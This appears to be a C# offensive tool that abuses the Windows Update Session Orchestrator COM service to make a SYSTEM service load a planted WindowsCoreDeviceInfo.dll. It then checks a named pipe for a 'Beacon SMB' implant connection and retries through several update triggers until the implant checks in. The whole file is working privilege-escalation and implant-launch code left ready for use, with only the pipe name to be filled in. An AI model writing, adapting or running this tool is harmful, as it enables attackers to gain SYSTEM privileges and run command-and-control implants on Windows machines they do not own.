using System;
using System.Reflection;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using static UsoSvc.Native;

namespace UsoSvc
{

    public class Program
    {
        
        private static IUpdateSessionOrchestrator _service;

        public static void Main(string[] args)
        {

            Console.WriteLine("     |__ Creating Instance of IUpdateSessionOrchestrator");
            _service = OrchestratorInstance();


            Console.WriteLine("     |__ Creating a new Update Session");
            _service.CreateUpdateSession(1, typeof(IUsoSessionCommon).GUID, out IUsoSessionCommon session);

            try
            {
                Console.WriteLine("     |__ Calling CoSetProxyBlanket for Session");
                CoSetProxyBlanket(session, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_DEFAULT, IntPtr.Zero, 0u);

                UsoAction usoAction = new UsoAction();
                
                // change 'pipe name' to match 
                NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "<ADD PIPE NAME HERE>", PipeDirection.In);

                bool iRes = true;
                //iRes = pipeClient.IsConnected;

                switch (usoAction)
                {
                    case UsoAction.USO_STARTSCAN:
                        Console.WriteLine("     |__ Calling 'StartScan'... \n");
                        session.Proc21(0, 0, "ScanTriggerUsoClient");
                        Console.WriteLine("...attempting DLL load\n");
                        try
                        {
                            Console.WriteLine("Testing pipe connection");
                            Thread.Sleep(5000);
                            pipeClient.Connect(3000);
                        }
                        catch (TimeoutException ex)
                        {
                            Console.WriteLine($"- - - > {ex.Message}\n");
                        }
                        if (iRes = pipeClient.IsConnected)
                        {
                            Console.WriteLine("Successful!\n ...dispose of pipe connect test\n");
                            pipeClient.Dispose();
                            Console.WriteLine("Enjoy\n");
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Beacon SMB pipe not connected - - - > 2nd attempt to trigger\n");
                            Thread.Sleep(2000);
                            goto case UsoAction.USO_STARTDOWNLOAD;
                        }

                    case UsoAction.USO_STARTDOWNLOAD:
                        Console.WriteLine("     |__ Calling 'StartDownload'... \n");
                        session.Proc22(0);
                        Console.WriteLine("...attempting DLL load\n");
                        try
                        {
                            Console.WriteLine("Testing pipe connection");
                            Thread.Sleep(5000);
                            pipeClient.Connect(3000);
                        }
                        catch (TimeoutException ex)
                        {
                            Console.WriteLine($" - - - > {ex.Message}\n");
                        }
                        if (iRes = pipeClient.IsConnected)
                        {
                            Console.WriteLine("Successful!\n ...dispose of pipe connect test\n");
                            pipeClient.Dispose();
                            Console.WriteLine("Enjoy\n");
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Beacon SMB pipe not connected - - - > 3rd attempt to trigger\n");
                            Thread.Sleep(2000);
                            goto case UsoAction.USO_STARTINTERACTIVESCAN;
                        }
                    case UsoAction.USO_STARTINTERACTIVESCAN:
                        Console.WriteLine("     |__ Calling 'StartInteractiveScan'... \n");
                        session.Proc21(0xffffffff, 0, "ScanTriggerUsoClientInteractive");
                        Console.WriteLine("...attempting DLL load\n");
                        try
                        {
                            Console.WriteLine("Testing pipe connection\n");
                            Thread.Sleep(5000);
                            pipeClient.Connect(3000);
                        }
                        catch (TimeoutException ex)
                        {
                            Console.WriteLine($" - - - > {ex.Message}\n");
                        }
                        if (iRes = pipeClient.IsConnected)
                        {
                            Console.WriteLine("Successful!\n ...dispose of pipe connect test\n");
                            pipeClient.Dispose();
                            Console.WriteLine("Enjoy\n");
                        }
                        else
                        {
                            Console.WriteLine("Beacon SMB pipe not connected - - - > verify WindowsCoreDeviceInfo.dll exists\n");
                        }
                        break;
                }
            }
            catch (COMException ex)
            {
                Console.WriteLine($"[!] Error creating new Update Session... {ex.Message}");
            }
        }


        private static IUpdateSessionOrchestrator OrchestratorInstance()
        {
            object obj = null;
            try
            {
                CoCreateInstance(typeof(UpdateSessionOrchestratorClass).GUID, null, 0x4, typeof(IUpdateSessionOrchestrator).GUID, out obj);
            }
            catch (COMException ex)
            {
                Console.WriteLine($"Error Creating Instance: {ex.Message}");
            }
            return obj as IUpdateSessionOrchestrator;
        }

    }

}

    

